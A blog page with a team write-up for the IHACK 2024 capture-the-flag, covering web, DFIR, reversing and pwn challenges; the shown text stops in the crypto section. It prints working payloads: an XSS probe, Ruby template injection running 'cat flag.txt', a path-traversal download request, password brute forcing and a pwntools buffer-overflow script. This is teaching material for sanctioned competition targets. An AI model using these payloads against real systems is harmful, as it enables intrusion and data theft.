@@ -1,0 +1,345 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>IDK_ihack writeup | Salad の Blog</title><meta name="author" content="salad07"><meta name="copyright" content="salad07"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="IDK team writeup  🚀 IHACK 2024 was an intense and thrilling CTF! We solved everything at the last minute, and a huge thanks to my teammates. Special shoutout to @Emmy for nailing the web and DFIR cha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IDK_ihack writeup">
+<meta property="og:url" content="http://example.com/2024/08/01/IDK_ihack%20writeup/index.html">
+<meta property="og:site_name" content="Salad の Blog">
+<meta property="og:description" content="IDK team writeup  🚀 IHACK 2024 was an intense and thrilling CTF! We solved everything at the last minute, and a huge thanks to my teammates. Special shoutout to @Emmy for nailing the web and DFIR cha">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2024-08-01T04:17:15.000Z">
+<meta property="article:modified_time" content="2024-08-01T04:27:47.586Z">
+<meta property="article:author" content="salad07">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://example.com/2024/08/01/IDK_ihack%20writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'IDK_ihack writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-01 12:27:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/diaries"><i class="fa-fw fa fa-book"></i><span> diaries</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/post.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="Salad の Blog"><span class="site-name">Salad の Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/diaries"><i class="fa-fw fa fa-book"></i><span> diaries</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">IDK_ihack writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-01T04:17:15.000Z" title="Created 2024-08-01 12:17:15">2024-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-08-01T04:27:47.586Z" title="Updated 2024-08-01 12:27:47">2024-08-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>13min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="IDK_ihack writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>IDK team writeup </p>
+<p>🚀 IHACK 2024 was an intense and thrilling CTF! We solved everything at the last minute, and a huge thanks to my teammates. Special shoutout to @Emmy for nailing the web and DFIR challenges! Then I steal her writeup and post here haahahaahahaha</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web-Character-Journey"><a href="#Web-Character-Journey" class="headerlink" title="Web -Character Journey"></a>Web -Character Journey</h2><p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.5870843.png">At first, register a user account then log in to see the UI, then I saw there are few options like viewing the profile, something like report to admin and another page that has not much function. </p>
+<p>So I took note of the admin account:</p>
+<p><em>admin acc</em> </p>
+<p><em><a href="mailto:&#97;&#100;&#109;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#97;&#116;&#111;&#114;&#x40;&#103;&#x6f;&#x6f;&#x67;&#108;&#x65;&#46;&#99;&#111;&#x6d;">&#97;&#100;&#109;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#97;&#116;&#111;&#114;&#x40;&#103;&#x6f;&#x6f;&#x67;&#108;&#x65;&#46;&#99;&#111;&#x6d;</a></em></p>
+<p><em>Sadiq Sigaraga</em></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.588595.png">Then I thought I can try brute force to get the admin account password since the first half which is the gmail is already given, so I input rockyou.txt and start to brute force it. </p>
+<p>In the meantime waiting was too boring, so I went back to check if I missed out anything else where the challenge can be solved without using brute forcing the admin account, then I came across my profile page and realized that the URL is vulnerable to IDOR which I can change the userID and see other ppl’s profile.<img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.591081.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.5921679.png"></p>
+<p>So, while leaving the admin account password continue to brute force, I used BurpSuite Intruder to run through 0-100 userID to check if there are any sus information in these directories. And poof! On the userID 53, the flag is set as the name of this user <strong>ihack24{655b7b7ae4c62d726a568eff8914573e}</strong><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.5930996.png"></p>
+<h2 id="Web-The-cat-challenge-simple-pimple"><a href="#Web-The-cat-challenge-simple-pimple" class="headerlink" title="Web -The cat challenge (simple pimple?)"></a>Web -The cat challenge (simple pimple?)</h2><p>At first, I found that there is a XSS vulnerability in the comment session of each cat pictures, injecting basic payload like <script>alert(1)</script> pops out the message box, thus I thought it is a challenge with XSS. However I tried several payload with XSS like getting the cookies but to no avail (cookie is totally empty).</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.5941043.png"></p>
+<p>So , its time to change path. Then I remember that when a challenge had xss vulnerabilities, it might also could be a ssti challenge. And so , I moved to the usual website I used which is hacktricks to find for payloads related to SSTI <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a> , but there are a lot of different payloads according to the different language used. I navigated to the Ruby language because once when was exploring the challenge, it went to the &#x2F;products&#x2F;0 and its shown that this is a ruby file and also saw information related to Sinatra, that leads to ruby.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.595133.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>Hacktricks further brought me to another link which is another heaven of payloads in github : <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.5962431.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>I tested out the payload available here, and found that the system runs over</p>
+<p> <strong>#{ 7 * 7 }</strong> because it responds as 49 in the comment session, which I can execute code using this syntax.<img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.5973027.png"></p>
+<p>I first tried with the code provided in my source and it did work and display the environment on comment session.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.5981784.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.599699.png"></p>
+<p>So, next step is just to do command injection with “ls” to see what are the files available, thus found the “flag.txt” among the file listed.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6007173.png"></p>
+<p>So, last thing to do is just to cat out the flag.txt with <em>#{ %x|cat flag.txt| }</em></p>
+<p> and we got the flag! <strong>ihack24{c484c41c5b7ffd81178c19391e0544ee}</strong><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6017106.png"></p>
+<h2 id="Web-employee-attendance"><a href="#Web-employee-attendance" class="headerlink" title="Web-employee attendance"></a>Web-employee attendance</h2><p>Spent around 1-2 hour on this, but actually it was easier than expected &#x3D;_&#x3D; , just tried on the wrong session I guess. At the source code, we can see that there is a hidden attribute which is &#x2F;admin&#x2F;flag.html that apparently mentioned that it is the flag file, but when trying to navigate to this link it shows some “unauthorized” messages.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6037102.png" alt="A computer screen shot of a program code Description automatically generated"></p>
+<p>In this app, there are 2 places to try accessing the url found above, first is to fetch it through &#x2F;data&#x2F; and another one is through the download action. </p>
+<p>The first method doesn’t work , it either response with moved permanently or unable to find files , so I moved on to try for the 2nd option.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6047096.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>Trying in Burpsuite Repeater show that the admin&#x2F;flag.html is being successfully passed through the server and the server also responded with file looks like flag. So just use the payload <em>&#x2F;download?month&#x3D;..&#x2F;admin&#x2F;flag.html</em>  and forward the session.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6058931.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>After downloading the zip file , we can see that the flag.html is successfully extracted and here goes the flag! <strong>ihack24{8d1f757aa744f459ac7ef07ebe0e2651}</strong><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6075542.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.60973.png" alt="A screenshot of a computer Description automatically generated"></p>
+<h1 id="DFIR"><a href="#DFIR" class="headerlink" title="DFIR"></a>DFIR</h1><h2 id="DFIR-Splunk2"><a href="#DFIR-Splunk2" class="headerlink" title="DFIR-Splunk2"></a>DFIR-Splunk2</h2><p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6107428.png"></p>
+<p>This question is to find the attacker Ip address, at first I just used the <em>index&#x3D;*</em> and see all the files, and since challenge mentioned the timing, I also adjusted it on the range at the right hand side to make it in between 23th of July.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.611742.png"></p>
+<p>Then I go through the menu bar at the left hand side and found there are several tags associated with Ip addresses. In the SourceIP, it is typically sus because of the huge amount of log related to it and the challenge is about remote brute force thingy, so I tried submit the flag with this IP and apparently it is correct!</p>
+<p><strong>ihack24{192.168.8.41}</strong></p>
+<h2 id="DFIR-Splunk3"><a href="#DFIR-Splunk3" class="headerlink" title="DFIR-Splunk3"></a>DFIR-Splunk3</h2><p>This challenge was to find when the attacker first successful logon </p>
+<p>Searching on google and chatgpt suggested me to filter using the Eventcode&#x3D;4624 that logs successful logon attempts and Logon_Type&#x3D;10 that focus on RDP logon attempts , but the result of the first few search are not appropriate and it leaded me to the wrong path. The first filter was <em>index&#x3D;* sourcetype&#x3D;WinEventLog:Security Logon_Type&#x3D;10</em> and another attempt was <em>index&#x3D;* sourcetype&#x3D;WinEventLog:Security EventCode&#x3D;4624 Logon_Type&#x3D;10</em></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6139019.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6139019.png"></p>
+<p>After raising a sanity check, the underlord said I was close but can try to change the index or something, but I still didn’t figured out what are the proper index. However, I thought of putting in the attacker Ip address from Splunk 2 as a reference so the filter becomes <em>index&#x3D;* EventCode&#x3D;4624 | search Source_Network_Address&#x3D;”192.168.8.41”</em> , I left out the logon_type&#x3D;10 because it seems not suitable for this challenge. This filter shows up a new timestamp than those 2 wrong previously submitted as wrong.<img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6153944.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>So, hopefully going for the last try <strong>ihack24{07&#x2F;23&#x2F;2024 09:55:52 PM}</strong> apparently is the flag!</p>
+<p>07&#x2F;23&#x2F;2024 09:55:52 PM</p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Crack-Me"><a href="#Crack-Me" class="headerlink" title="Crack Me"></a>Crack Me</h2><h3 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h3><p>Download and try to run the exe, it requires a license key for input.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6164992.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>Throw to IDA, see2 what inside</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6175313.png" alt="A screenshot of a computer code Description automatically generated"></p>
+<p>very good … no idea (after going through)</p>
+<p>I found out that a DLL missing to see, then check it out with using DotPEEK</p>
+<p>In form 1 (usually main in .net program), there is a ValidateLicenseKey and SecretKey function</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.619569.png" alt="A computer code with many black and white text Description automatically generated with medium confidence"></p>
+<p>Way to solve: ermmm just convert to python?</p>
+<h3 id="Scripting"><a href="#Scripting" class="headerlink" title="Scripting"></a>Scripting</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hidden = <span class="string">&quot;BRQFHF@WR\_+6 ,N:$78&quot;</span></span><br><span class="line">key = <span class="string">&quot;secret&quot;</span></span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(hidden)):</span><br><span class="line"> text += <span class="built_in">chr</span>(<span class="built_in">ord</span>(hidden[i]) ^ <span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line"> <span class="built_in">print</span>(text)</span><br><span class="line"> <span class="comment"># 1724-2321-NBSI-HACK</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.621632.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>Flag: ihack24{1724-2321-NBSI-HACK}</p>
+<h2 id="Brute-Force-Frenzy"><a href="#Brute-Force-Frenzy" class="headerlink" title="Brute Force Frenzy"></a>Brute Force Frenzy</h2><h3 id="Observation-1"><a href="#Observation-1" class="headerlink" title="Observation"></a>Observation</h3><p>Install and run the exe, it required license key</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.621632.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>Use ida to decompile and see2 what inside </p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.623.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>Then go in to check_license_key function</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.62401.png" alt="A computer code with text Description automatically generated"></p>
+<p>The function look like this, then find _data_start array to match this calculation </p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.625101.png" alt="A screenshot of a computer code Description automatically generated"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.625101.png"></p>
+<h3 id="Way-to-solve"><a href="#Way-to-solve" class="headerlink" title="Way to solve"></a>Way to solve</h3><p>Only need to focus on the v2 and v4 part (other useless)</p>
+<p>length of key must &#x3D;&#x3D; 8 &#x3D;&#x3D; length of _data_start__</p>
+<p>available range of key is between 32 – 126</p>
+<p>just brute to get the key </p>
+<h3 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x5B</span>, <span class="number">0x3E</span>, <span class="number">0x42</span>, <span class="number">0x13</span>, <span class="number">0x3B</span>, <span class="number">0x33</span>, <span class="number">0x48</span>, <span class="number">0x29</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line"> 		<span class="keyword">if</span> ((i+<span class="number">1</span>)\*j+<span class="number">13</span>)%<span class="number">97</span> == data[i]:</span><br><span class="line">			 <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> <span class="comment"># NI220G24</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Output-1"><a href="#Output-1" class="headerlink" title="Output"></a>Output</h3><p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6276462.png" alt="A computer screen with white text Description automatically generated"></p>
+<p>FLAG ihack24{NI220G24}</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ETC-Passwd-Reader"><a href="#ETC-Passwd-Reader" class="headerlink" title="ETC-Passwd Reader"></a>ETC-Passwd Reader</h2><h3 id="Observation-2"><a href="#Observation-2" class="headerlink" title="Observation"></a>Observation</h3><p>Download and run, it required password, but where? </p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.62869.png" alt="A screen shot of a computer Description automatically generated"> </p>
+<p>I use ghidra to decompile the code, see2 what inside </p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6300411.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p>Password is compared with P$s5w0rd_53CurE_A8S8A9DF7239FSD0</p>
+<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>The filename combines together &#x3D; &#x2F;etc&#x2F;passwd and allocate after 40 + 40 of input</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\_\_s = (<span class="type">char</span> \*)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">\_\_filename = (undefined4 \*)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">\*\_\_filename = <span class="number">0x6374652f</span>;</span><br><span class="line">\_\_filename[<span class="number">1</span>] = <span class="number">0x7361702f</span>;</span><br><span class="line">\_\_filename[<span class="number">2</span>] = <span class="number">0x647773</span>; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6310563.png" alt="A screenshot of a computer Description automatically generated"></p>
+<p><strong>Vulnerability Analysis</strong></p>
+<p>The application has a buffer overflow vulnerability due to the use of gets() to read input into a fixed-size buffer without checking the length of the input.</p>
+<p><strong>Hints</strong></p>
+<p>If dk the correct offset can test 1 by 1, there is showing the buffer</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.632054.png" alt="A screen shot of a computer Description automatically generated"></p>
+<p><strong>The flow should be like -&gt;</strong> P$s5w0rd_53CurE_A8S8A9DF7239FSD0 + A*(80-len(pass)) + path(&#x2F;flag&#x2F;secretflag&#x2F;flag)</p>
+<p>BUT !!!!</p>
+<p>** If we provide the password without the null terminator, the program might continue reading past the intended end of the string, then will show the wrong password. So <strong>\x00</strong> should be added after the password. (SHOUTOUT to GPT)</p>
+<p><strong>New flow should be like -&gt;</strong> P$s5w0rd_53CurE_A8S8A9DF7239FSD0\x00 + A*(80-len(pass)) + path(&#x2F;flag&#x2F;secretflag&#x2F;flag)</p>
+<h3 id="Scripting-1"><a href="#Scripting-1" class="headerlink" title="Scripting"></a>Scripting</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*</span><br><span class="line"><span class="comment"># Setup the target connection</span></span><br><span class="line">host = <span class="string">&#x27;etc-passwd-reader.ihack24.capturextheflag.io&#x27;</span> <span class="comment"># Replace with the actual host</span></span><br><span class="line">port = <span class="number">1337</span> <span class="comment"># Replace with the actual port</span></span><br><span class="line"><span class="comment"># # Connect to the remote service</span></span><br><span class="line"></span><br><span class="line">p = remote(host, port)</span><br><span class="line">p = process(<span class="string">&#x27;./etcpasswd-reader&#x27;</span>)</span><br><span class="line">offset = <span class="number">80</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># The super secure password</span></span><br><span class="line">pwd = <span class="string">b&#x27;P$s5w0rd\_53CurE\_A8S8A9DF7239FSD0\x00&#x27;</span></span><br><span class="line">location = <span class="string">b&#x27;/flag/secretflag/flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the payload</span></span><br><span class="line"><span class="comment"># Add pwd, then fill with &#x27;A&#x27; to overflow the buffer, then add the flag path</span></span><br><span class="line">payload = pwd + <span class="string">b&#x27;A&#x27;</span> \* (offset - <span class="built_in">len</span>(pwd)) + location</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Enter password to get details: &quot;</span>, payload)</span><br><span class="line"><span class="comment"># Interact with the shell to get the output</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>ps: I’m a pwn beginner, THX a lot to GPT help me in scripting 🤩, can auto count offset, but idk how, will try next time (立flag)</p>
+<p>Output</p>
+<p><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/img-ctf-1722485835.6352673.png" alt="A computer screen shot of a computer program Description automatically generated"></p>
+<p>Flag: ihack{fafbcd5d5dbc4bc4d870cf644719c2f8399a7597e633ba1ca3448f55e7511860}</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto-SOS-Decrypt-or-Repeat"><a href="#Crypto-SOS-Decrypt-or-Repeat" class="headerlink" title="Crypto SOS! Decrypt or Repeat"></a>Crypto SOS! Decrypt or Repeat</h2><h3 id="Observation-3"><a href="#Observation-3" class="headerlink" title="Observation"></a>Observation</h3><p><strong>Encryption Used: AES + CBC mode with 256-bit key + IV</strong></p>
+<p>The key and IV are derived using custom key derivation functions (KDFs) based on mathematical series.</p>
